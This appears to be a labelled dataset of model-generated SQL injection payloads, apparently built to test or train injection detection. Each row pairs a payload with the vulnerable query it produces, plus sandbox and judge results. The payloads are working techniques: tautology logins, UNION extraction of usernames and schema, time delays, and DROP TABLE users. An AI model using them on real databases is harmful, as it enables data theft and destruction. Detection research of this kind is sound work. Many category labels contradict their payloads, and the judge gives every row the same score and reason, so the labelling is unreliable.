query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00910,1' AND 1=1--,SELECT * FROM orders WHERE status = '1' AND 1=1--' ORDER BY date DESC,tautology,order_filter,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ"", ""And""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00911,' OR 0=0;,SELECT * FROM orders WHERE status = '' OR 0=0;' ORDER BY date DESC,tautology,order_filter,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00917,; SELECT database() /*,SELECT * FROM users WHERE id = ; SELECT database() /*,union_based,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00918,-- WAITFOR DELAY '0:0:5',SELECT * FROM users WHERE id = -- WAITFOR DELAY '0:0:5',union_based,user_lookup,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00920,--; WAITFOR DELAY '0:0:10',SELECT * FROM orders WHERE status = '--; WAITFOR DELAY '0:0:10'' ORDER BY date DESC,union_based,order_filter,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00921,OR 1=1 /*--,SELECT * FROM orders WHERE status = 'OR 1=1 /*--' ORDER BY date DESC,union_based,order_filter,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00924,--,"INSERT INTO comments (user_id, body) VALUES (1, '--')",union_based,comment_insert,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00925,; IF 1=1 BEGIN; DROP TABLE users; --,SELECT * FROM users WHERE username = '; IF 1=1 BEGIN; DROP TABLE users; --' AND password = 'anything',blind_boolean,login,1,1,0.0,True,default,"[""Drop"", ""Identifier"", ""Table"", ""Command"", ""Semicolon""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00926,"; IF ASCII(SUBSTRING('admin', 1, 1)) > 97 BEGIN; DROP TABLE users; --","SELECT * FROM users WHERE username = '; IF ASCII(SUBSTRING('admin', 1, 1)) > 97 BEGIN; DROP TABLE users; --' AND password = 'anything'",blind_boolean,login,1,1,0.0,True,default,"[""Drop"", ""Identifier"", ""Table"", ""Command"", ""Semicolon""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00928,"' OR EXTRACT(HOUR FROM GETDATE()) = EXTRACT(HOUR FROM DATEADD(HOUR, 1, GETDATE())) --","SELECT * FROM products WHERE name LIKE '%' OR EXTRACT(HOUR FROM GETDATE()) = EXTRACT(HOUR FROM DATEADD(HOUR, 1, GETDATE())) --%'",blind_boolean,search,1,1,0.0,True,default,"[""Identifier"", ""Anonymous"", ""Table"", ""Extract"", ""Or"", ""Column"", ""Select"", ""Where"", ""Literal"", ""From"", ""Star"", ""Var"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00930,"' OR 1=1 UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM users), NULL --","SELECT * FROM users WHERE id = ' OR 1=1 UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM users), NULL --",blind_boolean,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Count"", ""Literal"", ""From"", ""Subquery"", ""Null"", ""Star"", ""Union"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00931,"' OR 1=1 UNION ALL SELECT NULL, NULL, (SELECT username FROM users WHERE id = 1), NULL --","SELECT * FROM users WHERE id = ' OR 1=1 UNION ALL SELECT NULL, NULL, (SELECT username FROM users WHERE id = 1), NULL --",blind_boolean,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Subquery"", ""Null"", ""Star"", ""Union"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00937,' AND (SELECT COUNT(*) FROM system.users WHERE username LIKE 'admin' AND 1=1) > 0 --,SELECT * FROM users WHERE username = '' AND (SELECT COUNT(*) FROM system.users WHERE username LIKE 'admin' AND 1=1) > 0 --' AND password = 'anything',blind_time,login,1,1,0.0,True,default,"[""GT"", ""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Count"", ""Literal"", ""From"", ""Subquery"", ""Like"", ""Star"", ""EQ"", ""And""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00939,%'-- OR WAITFOR DELAY '0:0:5',SELECT * FROM products WHERE name LIKE '%%'-- OR WAITFOR DELAY '0:0:5'%',blind_time,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00940,%' OR EXISTS(SELECT 1 FROM sys.objects WHERE type = 'U' AND name LIKE '%users%' AND 1=1),SELECT * FROM products WHERE name LIKE '%%' OR EXISTS(SELECT 1 FROM sys.objects WHERE type = 'U' AND name LIKE '%users%' AND 1=1)%',blind_time,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Like"", ""Star"", ""EQ"", ""Exists"", ""And""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00941,") UNION ALL SELECT NULL,'',NULL WHere id > 1 --","SELECT * FROM users WHERE id = ) UNION ALL SELECT NULL,'',NULL WHere id > 1 --",blind_time,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00942,-- WAITFOR DELAY '0:0:2',SELECT * FROM users WHERE id = -- WAITFOR DELAY '0:0:2',blind_time,user_lookup,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00944,') OR 1=1--,"INSERT INTO comments (user_id, body) VALUES (1, '') OR 1=1--')",blind_time,comment_insert,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Paren"", ""Column"", ""Select"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00947,""" OR ""1""=""1"" UNION SELECT ""a"", ""b"", ""c"", ""d"" FROM information_schema.tables WHERE table_schema='public'","SELECT * FROM products WHERE name LIKE '%"" OR ""1""=""1"" UNION SELECT ""a"", ""b"", ""c"", ""d"" FROM information_schema.tables WHERE table_schema='public'%'",stacked_queries,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""Union"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00949,""" OR ""1"" LIKE ""1""; -- UNION SELECT 'x', 'y''","SELECT * FROM users WHERE id = "" OR ""1"" LIKE ""1""; -- UNION SELECT 'x', 'y''",stacked_queries,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Semicolon"", ""Literal"", ""From"", ""Like"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00950,' OR 1=1--; WAITFOR DELAY '0:0:10; --,SELECT * FROM users WHERE id = ' OR 1=1--; WAITFOR DELAY '0:0:10; --,stacked_queries,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00951,' OR 1=1--/**/,SELECT * FROM users WHERE id = ' OR 1=1--/**/,stacked_queries,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00952,' OR '1'='1,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything',comment_obfuscation,login,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00953,') AND 1=1 --,SELECT * FROM users WHERE username = '') AND 1=1 --' AND password = 'anything',comment_obfuscation,login,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Paren"", ""Column"", ""Select"", ""Literal"", ""From"", ""Star"", ""EQ"", ""And""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00955,' OR '1'>1 --,SELECT * FROM products WHERE name LIKE '%' OR '1'>1 --%',comment_obfuscation,search,1,1,0.0,True,default,"[""GT"", ""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00956,) OR 1>1 /*,SELECT * FROM products WHERE name LIKE '%) OR 1>1 /*%',comment_obfuscation,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00957,--1'/*' OR 1=1--,SELECT * FROM products WHERE name LIKE '%--1'/*' OR 1=1--%',comment_obfuscation,search,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00958,--#1' OR 1=1 /*#,SELECT * FROM users WHERE id = --#1' OR 1=1 /*#,comment_obfuscation,user_lookup,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00961,'1' OR 'admin' --,SELECT * FROM users WHERE username = ''1' OR 'admin' --' AND password = 'anything',encoding_obfuscation,login,1,1,0.0,True,default,"[""Or"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00963,; DROP TABLE users; --,SELECT * FROM users WHERE username = '; DROP TABLE users; --' AND password = 'anything',encoding_obfuscation,login,1,1,0.0,True,default,"[""Semicolon"", ""Drop"", ""Identifier"", ""Table""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00965,) + ascii('a') + ascii('d') + ascii('m') + ascii('a'); --,SELECT * FROM users WHERE username = ') + ascii('a') + ascii('d') + ascii('m') + ascii('a'); --' AND password = 'anything',encoding_obfuscation,login,1,1,0.0,True,default,"[""Ascii"", ""Identifier"", ""Where"", ""Table"", ""Add"", ""Paren"", ""Select"", ""Semicolon"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00966,-- WAITFOR DELAY '0:0:5',SELECT * FROM products WHERE name LIKE '%-- WAITFOR DELAY '0:0:5'%',encoding_obfuscation,search,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00967,' AND EXISTS(SELECT * FROM users WHERE username='admin') --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT * FROM users WHERE username='admin') --%',encoding_obfuscation,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ"", ""Exists"", ""And""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00968,") UNION ALL SELECT NULL,NULL,'A'--","SELECT * FROM products WHERE name LIKE '%) UNION ALL SELECT NULL,NULL,'A'--%'",encoding_obfuscation,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Paren"", ""Select"", ""Literal"", ""From"", ""Null"", ""Star"", ""Union"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00969,' OR 1=1--,SELECT * FROM users WHERE id = ' OR 1=1--,encoding_obfuscation,user_lookup,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00971,--' OR 1=1',SELECT * FROM orders WHERE status = '--' OR 1=1'' ORDER BY date DESC,encoding_obfuscation,order_filter,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00972,' OR 1>0,SELECT * FROM orders WHERE status = '' OR 1>0' ORDER BY date DESC,encoding_obfuscation,order_filter,1,1,0.0,True,default,"[""GT"", ""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
